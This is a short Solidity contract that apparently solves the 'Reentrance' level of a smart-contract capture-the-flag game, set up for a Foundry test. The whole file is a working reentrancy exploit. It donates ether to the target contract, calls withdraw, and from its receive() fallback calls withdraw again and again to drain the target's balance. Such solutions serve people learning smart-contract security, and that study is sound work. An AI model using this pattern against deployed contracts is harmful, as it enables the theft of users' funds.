// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../src/Reentrance.sol";
import "forge-std/console.sol";

contract ReentranceSolver {
  Reentrance reentranceInstance;
  uint256 topup;

  constructor(address reentranceAddress) public {
    reentranceInstance = Reentrance(payable(reentranceAddress));
  }
  function solve() public payable {
    topup = msg.value;
    reentranceInstance.donate{value: msg.value}(address(this));
    reentranceInstance.withdraw(msg.value);
  }

  receive() external payable {
    console.logString("entered");
    reentranceInstance.withdraw(topup); 
  }
}